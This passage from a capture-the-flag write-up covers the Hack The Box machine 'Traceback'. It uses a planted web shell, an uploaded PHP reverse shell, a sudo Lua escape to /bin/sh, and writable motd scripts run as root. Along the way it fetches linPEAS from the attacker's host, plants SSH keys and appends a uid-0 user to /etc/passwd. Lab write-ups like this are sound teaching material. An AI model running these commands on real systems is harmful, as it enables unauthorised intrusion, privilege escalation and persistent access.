~~~

Nothing special here, we find SSH on port 22 and a web site on port 80.


### 2.2- OSINT

Let's have a look on the web site:



![website.png](images/website.png)

Ohmy ! You're such a bad boy **Xh4H**, but not a stealthy one. There is the message "Some of the best web shells that you might need ;)" in the source code and if we google this name, we find several things:



![search.png](images/search.png)

Looking at the Tweeter account, we have to pay attention to what happened when the box was released. It was released on 14 march 2020. Here is what he wrote at this time:


![twitter.png](images/twitter.png)

The only interesting tweet is the last one. A web shell is not something that a Hack The Box engineer (see his [Linkedin profile](https://www.linkedin.com/in/juanjimenezbleye/), which address is on the site [https://www.xh4h.com](https://www.xh4h.com)) is interested in, he wrote on the webpage that he "left a backdoor for all the net" and it refers to the message in the source code. There must be something with this.

On the Github repo, we find:

![github.png](images/github.png)

So let's see:

- We know there is a backdoor on the web site
- The hacker pointed out a Github repository which contains a list of web shells

The conclusion of this part is simply that one of these web shells is our backdoor, ie. it has been uploaded on the web site by Xh4H. We should try them out.


### 2.3- Foothold

Indeed, we just have to try them one by one to find that smevk.php (SmEvK v3) is the right one:



![smevk.png](images/smevk.png)


**"admin:admin"** allows to access the main page, which also gives us a bunch of informations about the target:



![smevkmain.png](images/smevkmain.png)

Now, as this is a web shell, it is easy to get a reverse shell. One of the ways to get it: the "Upload file" field seems appropriate.

Although some other reverse shells would work (check out my [cheat sheet](https://flast101.github.io/reverse-shell-cheatsheet/) for more reverse shells), we choose to use the file **[php-reverse-shell.php](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)** that you can also download [here](http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz).

We change the IP and port according to our needs and upload the file.
Once it is done, we set up a Netcat listener on our attacking machine, and we just have to "curl" the php shell you uploaded... We have our reverse shell:


![firstshell.png](images/firstshell.png)

At this point, the shell is not good. We can use the following commands to improve our shell:
1. `$ python3 -c 'import pty; pty.spawn("/bin/bash")'`
2. `Ctrl+Z`
3. `$ stty raw -echo`
4. `$ fg`

_Side note: python is not installed, that's why we use **python3** here._


We should now have a real shell (interactive, auto-completion, no exit from the shell when killing a process with Ctrl+C...). The screen should look like this:

![goodshell.png](images/goodshell.png)


* * *
## 3- Privilege Escalation

### 3.1- Lua-ctivities
At this point, we should always first look around to see what we've got and only then use an enumeration tool as linPEAS.

Looking at the home folder, we get the following:

~~~
webadmin@traceback:/home/webadmin$ ll
total 44
drwxr-x--- 5 webadmin sysadmin 4096 Mar 16 04:03 ./
drwxr-xr-x 4 root     root     4096 Aug 25  2019 ../

-rw------- 1 webadmin webadmin    0 Feb 27 06:29 authorized_keys

webadmin@traceback:/home/webadmin$ cat note.txt
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.

webadmin@traceback:/home/webadmin$ cat .bash_history
ls -la
sudo -l
nano privesc.lua
sudo -u sysadmin /home/sysadmin/luvit privesc.lua
rm privesc.lua
logout
~~~

What do we have here ?
- We can read and write "authorized_keys" file. We could insert our public key to then ssh as webadmin user to keep an access to the machine but it is useless here.
- Sysadmin left us a tool to pratice Lua, a programming language.
- The webadmin user already practiced and he wrote a file he called "privesc.lua".

Hmm, I wonder if this is a clue... What do you think ? ;-))
OK, what can we sudo as "webadmin" ?
~~~
webadmin@traceback:/home/webadmin$ sudo -l
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
~~~

Indeed we can execute the command **`/home/sysadmin/luvit privesc.lua`** as _**sysadmin**_ and this is what was done previously as mentioned in history file.

The file _**privesc.lua**_ has been removed but we can write anything we want in our home directory. We just want to know what is the lua command to execute bash and we will get a _**sysadmin**_ user shell.


[Lua](http://www.lua.org/about.html) is a scripting language, and _**sysadmin**_ installed [luvit](https://luvit.io/) which implements some APIs in Lua, and allows to run ***.lua*** script files.
Going through [lua documentation](http://www.lua.org/manual/5.3/), we can easily find the link to the chapter **[Operating System Facilities]((http://www.lua.org/manual/5.3/manual.html#6.9))**. There, we find the command **`os.execute`**:

![osexecute.png](images/osexecute.png)


### 3.2- Getting user.txt

We found an easy way to escalete to _**sysadmin**_ user. Let's do this:
~~~
webadmin@traceback:/home/webadmin$ echo 'os.execute("/bin/sh")' > privesc.lua
webadmin@traceback:/home/webadmin$ sudo -u sysadmin /home/sysadmin/luvit privesc.lua
$ id
uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)
~~~


And we find ***user.txt*** file in ***sysadmin*** home directory:

![user-txt.png](images/user-txt.png)


### 3.3- Post-Compromise Enumeration

We set up a web server on our machine with **`python3 -m http.server 80`**, download linPEAS on the target using **`wget`**, and run it:
~~~
sysadmin@traceback:~$ wget http://10.10.14.20/linpeas.sh
--2020-08-14 23:06:07--  http://10.10.14.20/linpeas.sh

sysadmin@traceback:~$ chmod +x linpeas.sh
sysadmin@traceback:~$ ./linpeas.sh
~~~

It's not easy to find, but if you have a close look, you will notice something about **motd** also known as **Message Of The Day**.

First, some files in _**/etc/update-motd.d/**_ were modified udring the last 5 minutes:

![linpeas1.png](images/linpeas1.png)

Then, those same files are writable by our _**sysadmin**_ user:

![linpeas2.png](images/linpeas2.png)

And last but not least, a running process copies files located in _**/var/backups/.update-motd.d**_ into _**/etc/update-motd.d**_

![linpeas3.png](images/linpeas3.png)


We must be clear about it and know exactely what's going on. A good tool to do this is **`pspy`**. [pspy](https://github.com/DominicBreuker/pspy) is a command line tool designed to snoop on processes without need for root permissions.
Let's [download](https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64) it on the target and run it:

![pspy.png](images/pspy.png)

We see here that the files we mentioned are copied every minute. As this is not done scheduled the **crontab**, it must be done by a timer. Looking at the timers, it is easy to confirm:

~~~
sysadmin@traceback:~$ ll /lib/systemd/system/*.timer
-rw-r--r-- 1 root root 156 May  7  2019 /lib/systemd/system/apt-daily.timer
-rw-r--r-- 1 root root 184 May  7  2019 /lib/systemd/system/apt-daily-upgrade.timer

~~~

What about the file that are copied ? Actually, the files are executable scripts and those that are located in ***/etc/update-motd.d/*** are writable while the files located in ***/var/backups/.update-motd.d/*** can not be read or writen as ***sysadmin***.

~~~
sysadmin@traceback:~$ ll /etc/update-motd.d/

-rwxr-xr-x 1 root root  299 Aug 25  2019 91-release-upgrade*
~~~

Conclusion, we have RW access to scripts that are executed with root permission and are overwritten every minute.
Now the plan is to modify and execute these scripts to make them grant us root privileges before they are overwritten.

However, I won't be able to say "I love it when a plan comes together" if I don't know more about **The Message Of The Day**.

### 3.4- The Message Of The Day

Information about **motd**:
- [Ubuntu Manuals](http://manpages.ubuntu.com/manpages/bionic/man5/update-motd.5.html)
- [LinuxConfig.org](https://linuxconfig.org/how-to-change-welcome-message-motd-on-ubuntu-18-04-server)

Linux system administrators often communicate important information to console and remote users by maintaining text, which is displayed by the pam_motd module on interactive shell logins like SSH shell.

Message of the day is modular hence split into various scripts executed in order from lowest to highest number value as part of the script's file name prefix. The following scripts are located within the _**/etc/update-motd.d**_ directory as part of the default motd daemon configuration:
~~~
$ ls /etc/update-motd.d/
00-header     50-landscape-sysinfo  80-esm        90-updates-available  95-hwe-eol      98-fsck-at-reboot
10-help-text  50-motd-news          80-livepatch  91-release-upgrade    97-overlayroot  98-reboot-required
~~~

These executable scripts in _**/etc/update-motd.d/**_ are executed by pam_motd as the root user at each login.
For example, here is the content of the file ***00-header***:
~~~
sysadmin@traceback:~$ cat /etc/update-motd.d/00-header
#!/bin/sh
#
#    00-header - create the header of the MOTD

echo "\nWelcome to Xh4H land \n"
~~~


**Very nice! Each time we login, whatever the user, the scripts located in */etc/update-motd.d/* are executed as root user.**
We just need to find a way to login using SSH and we are done!

### 3.5 Getting root.txt

The SSH login part is easy as we have acces to our ***.ssh/authorized_keys*** file.
Let's add our public key corresponding to our attacking machine private key (or generate a pair of keys with **`ssh-keygen`**) to the ***.ssh/authorized_keys*** file.

On our machine: **`# cat .ssh/id_rsa.pub`**    
On the target: **`$ echo "cat_id_rsa_result" >> /home/sysadmin/.ssh/authprized_keys`**    

Now let's try to log in:
~~~
root@kali:~# ssh -i id_rsa sysadmin@10.10.10.181
Warning: Identity file id_rsa not accessible: No such file or directory.
The authenticity of host '10.10.10.181 (10.10.10.181)' can't be established.
ECDSA key fingerprint is SHA256:7PFVHQKwaybxzyT2EcuSpJvyQcAASWY9E/TlxoqxInU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.181' (ECDSA) to the list of known hosts.
#################################

- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land


Last login: Mon Mar 16 03:50:24 2020 from 10.10.14.2
$ id
uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)
$ exit
Connection to 10.10.10.181 closed.
~~~

It works and we see it displays "Welcome to Xh4H land", which means it probably displays the output of the ***00-header*** script execution.

Now let's try to modify the ***00-header*** script and login **immediately** after that:
~~~
sysadmin@traceback:$ echo 'cat /root/root.txt' >> /etc/update-motd.d/00-header
~~~

When we login as ***sysadmin***:

![root-txt.png](images/root-txt.png)


Very good! We got the root.txt flag! But is it enough for you ? For me it is not because we didn't root the box...

### 3.6- Root Privilege Escalation

We have several options here. The most common are:

- a reverse shell,
- insert a public key in the ***authorized_keys*** file in the ***/root/.ssh*** directory,
- create a new root user by adding it in the ***/etc/passwd*** file.

The first one is very common and as we just used the second option in the previous chapter, let's try the third one.

We will create a user **"newroot"** with the password **"newrootpass"**, using md5crypt algorithm to hash the password.

First, we hash the password with **`openssl`** using the salt "evil":
~~~
root@kali:~$ openssl passwd -1 -salt evil newrootpass
$1$evil$eu2ySQGNgNghQm4ASTnKa.
~~~

We create a file named "newroot" containing the line we want to add to the /etc/passwd file on the target:

~~~
sysadmin@traceback:~$ echo 'newroot:$1$evil$eu2ySQGNgNghQm4ASTnKa.:0:0:root:/root:/bin/bash' > newroot
sysadmin@traceback:~$ cat newroot
newroot:$1$evil$eu2ySQGNgNghQm4ASTnKa.:0:0:root:/root:/bin/bash
~~~

Then, we modify the ***00-header*** file:
~~~
sysadmin@traceback:~$ echo 'cat /home/sysadmin/newroot >> /etc/passwd' >> /etc/update-motd.d/00-header
~~~
And finally, we immediately login as sysadmin to make the script be executed:

Here is the result:   

![finalroot.png](images/finalroot.png)

We rooted the box ! **I love it when a plan comes together. ;-))**
